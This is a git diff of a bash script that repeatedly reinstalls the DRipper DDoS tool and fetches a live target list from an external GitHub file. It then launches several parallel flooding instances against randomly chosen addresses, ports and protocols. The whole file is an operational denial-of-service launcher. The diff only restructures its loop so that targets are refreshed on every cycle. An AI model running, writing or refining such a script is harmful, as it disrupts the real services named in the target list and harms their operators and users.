@@ -21,13 +21,11 @@ fi
 # With high number of copies console output will be messy because all instances of DRipper use same terminal.
 num_of_targets=8
 
-
 # Restart DRipper.py every N seconds (600s = 10m, 1800s = 30m, 3600s = 60m)
 restart_time=600
 
 while true
 do
-   
    # Download latest version of DDripper.
    cd ~
    rm -rf russia_ddos
@@ -35,20 +33,18 @@ do
    cd russia_ddos
    pip install -r requirements.txt
 
-
    # Restart DRipper_main after N seconds (default 600s = 10m)
    sleep $restart_time
    pkill -f DRipper.py
-done
+   
+   list_size=$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/DRipper_targets | cat | wc -l)
 
-list_size=$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/DRipper_targets | cat | wc -l)
+   # Get multiple random numbers to choose multiple targets from DRipper_targets
+   random_numbers=$(shuf -i 1-$list_size -n $num_of_targets)
 
-# Get multiple random numbers to choose multiple targets from DRipper_targets
-random_numbers=$(shuf -i 1-$list_size -n $num_of_targets)
-
-# Launch several copies of DRipper.
-for i in $(seq 1 $num_of_targets)
-do
+   # Launch several copies of DRipper.
+   for i in $(seq 1 $num_of_targets)
+      do
              # Get address, port and protocol from pre-selected target
              site=$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/DRipper_targets | cat | shuf -n 1)
              addr=$(echo $site | awk '{print $1}')
@@ -57,4 +53,5 @@ do
             
              # Launch DRipper
              python3 -u ~/russia_ddos/DRipper.py -l 2048 -s $addr -p $port -m $prot -t 50&
+      done
 done
